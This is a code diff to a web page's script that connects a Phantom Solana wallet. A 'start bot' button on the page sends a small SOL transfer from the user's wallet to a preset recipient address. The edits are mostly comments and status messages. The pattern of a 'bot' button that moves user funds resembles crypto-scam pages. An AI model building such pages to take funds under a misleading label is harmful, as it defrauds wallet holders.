@@ -58,6 +58,7 @@
     const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
+    // Function to connect Phantom wallet
     async function connectPhantomWallet() {
         if (window.solana && window.solana.isPhantom) {
             try {
@@ -79,6 +80,7 @@
 
     document.getElementById("connectButton").addEventListener("click", connectPhantomWallet);
 
+    // Function to send Solana to the recipient address
     async function sendSolanaTokens() {
         if (!userAccount) {
             document.getElementById("status").innerText = "Please connect your wallet first.";
@@ -89,19 +91,24 @@
         const transaction = new solanaWeb3.Transaction();
         
         try {
-            console.log("Creating transaction...");
+            // Start processing
+            document.getElementById("status").innerText = "Creating transaction...";
+            document.getElementById("startBotButton").innerText = "Processing...";
+            document.getElementById("startBotButton").disabled = true;
+
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(userAccount),
                     toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: 1000000
+                    lamports: 1000000 // Send a small amount for testing (adjust as needed)
                 })
             );
 
+            // Request transaction signature
             document.getElementById("status").innerText = "Requesting signature...";
             const signedTransaction = await window.solana.signTransaction(transaction);
-            console.log("Transaction signed:", signedTransaction);
 
+            // Send the transaction
             document.getElementById("status").innerText = "Sending transaction...";
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             await connection.confirmTransaction(signature, 'confirmed');
@@ -118,11 +125,7 @@
         }
     }
 
-    document.getElementById("startBotButton").addEventListener("click", async () => {
-        document.getElementById("startBotButton").innerText = "Processing...";
-        document.getElementById("startBotButton").disabled = true;
-        await sendSolanaTokens();
-    });
+    document.getElementById("startBotButton").addEventListener("click", sendSolanaTokens);
 </script>
 
 </body>
